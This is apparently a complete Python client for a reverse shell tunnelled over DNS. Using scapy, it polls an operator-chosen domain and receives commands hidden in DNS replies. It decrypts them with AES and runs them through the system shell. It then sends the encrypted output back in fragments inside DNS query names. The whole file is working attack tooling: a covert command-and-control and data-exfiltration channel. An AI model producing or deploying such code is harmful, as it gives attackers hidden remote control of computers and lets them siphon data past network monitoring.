#!/usr/bin/env python3
from scapy.all import IP, UDP, DNS, DNSQR, sr, sr1
from base64 import b64encode, b64decode
from random import randint, choice
from time import sleep
from Crypto.Cipher import AES

import subprocess
import threading
import argparse
import zlib
import hashlib
import os

parser = argparse.ArgumentParser(description="DNS Reverse Shell Client")
parser.add_argument('domain', metavar='domain', type=str, help='Domain to connect to')
parser.add_argument('-i',
                    '--interface',
                    action='store',
                    type=str,
                    help='Interface to use',
                    default='eth0')
parser.add_argument('-I',
                    '--interval',
                    action='store',
                    type=float,
                    help='Interval between sending DNS packets',
                    default=0.02)
parser.add_argument(
    '-p',
    '--pulse',
    action='store',
    type=float,
    help='How often to pulse the server in seconds (Lower number means faster response time)',
    default=1)
parser.add_argument(
    '-t',
    '--timeout',
    action='store',
    type=int,
    help=
    'How long it takes to recover from lost packet in seconds (Lower number means faster recover time)',
    default=5)
parser.add_argument('-k', '--key', action='store', type=str, help='Password to use', required=True)

args = parser.parse_args()

DOMAIN = args.domain
IFACE = args.interface
INTERVAL = args.interval
PULSE = args.pulse
TIMEOUT = args.timeout
KEY = hashlib.sha256(args.key.encode()).digest()

FRAG_LEN = 70 - len(DOMAIN)

QUERIES = ['A', 'MX', 'TXT', 'CNAME', 'SOA']

recv = b""  # Buffer of received data to process


# Execute shell command
def execute(cmd: str) -> bytes:
    out, err = subprocess.Popen([cmd], stdout=subprocess.PIPE, stderr=subprocess.PIPE,
                                shell=True).communicate()

    if out:
        return out
    else:
        return err


# Pulse the server at interval
def pulse() -> None:
    global recv
    while True:
        ip = IP(dst=f"www.{DOMAIN}")
        udp = UDP(dport=53)
        dns = DNS(id=randint(0x0, 0xffff),
                  rd=1,
                  qr=0,
                  qd=DNSQR(qname=f"pulse.{DOMAIN}", qtype=choice(QUERIES)))

        res = sr1(ip / udp / dns, iface=IFACE, verbose=False, timeout=TIMEOUT)

        try:
            data = res.an.rrname.split(f".{DOMAIN}".encode())[0]

            # Run command when it's not a pulse
            if data != b"pulse":
                recv += data

                if res[DNS].z == 1:
                    cmd = decode(recv)
                    try:
                        print(cmd)
                        send_data(execute(cmd))
                    except:
                        print("Data got corrupted!")
                    recv = b""
        except:
            print("Server is not up")

        sleep(PULSE)


# Encrypt data
def encrypt(raw: bytes) -> bytes:

    def _pad(s):
        return s + (AES.block_size - len(s) % AES.block_size) * chr(AES.block_size - len(s) %
                                                                    AES.block_size).encode()

    cipher = AES.new(KEY, AES.MODE_CBC)
    return cipher.iv + cipher.encrypt(_pad(raw))


# Decrypt data
def decrypt(enc: bytes) -> bytes:

    def _unpad(s):
        return s[:-ord(s[len(s) - 1:])]

    iv = enc[:AES.block_size]

    cipher = AES.new(KEY, AES.MODE_CBC, iv)
    return _unpad(cipher.decrypt(enc[AES.block_size:]))


# Encode data into base64 and fragment it
def encode(data: bytes) -> list:
    data = data.strip()
    data = zlib.compress(data)
    data = encrypt(data)
    e_data = b64encode(data).decode()
    frag_e_data = [e_data[i:i + FRAG_LEN] for i in range(0, len(e_data), FRAG_LEN)]
    return frag_e_data


# Decode base64 data
def decode(data: bytes) -> str:
    data = b64decode(data)
    data = decrypt(data)
    try:
        data = zlib.decompress(data)
        return data.decode()
    except:
        print("Wrong Key used")
        os._exit(1)


# Send data over DNS
def send_data(data: bytes) -> None:
    frag_e_data = encode(data)

    req = []
    for i, data in enumerate(frag_e_data):
        ip = IP(dst=f"www.{DOMAIN}")
        udp = UDP(dport=53)
        dns = DNS(id=randint(0x0, 0xffff),
                  rd=1,
                  qr=0,
                  qd=DNSQR(qname=f"{data}.{DOMAIN}", qtype=choice(QUERIES)))

        # Check if it's last item in the base64 string
        if i + 1 == len(frag_e_data):
            dns.z = 1

        req.append(ip / udp / dns)

    return sr(req, inter=INTERVAL, iface=IFACE, verbose=False, timeout=TIMEOUT)


def main():
    print("Client started!")
    threading.Thread(target=pulse).start()


if __name__ == "__main__":
    main()
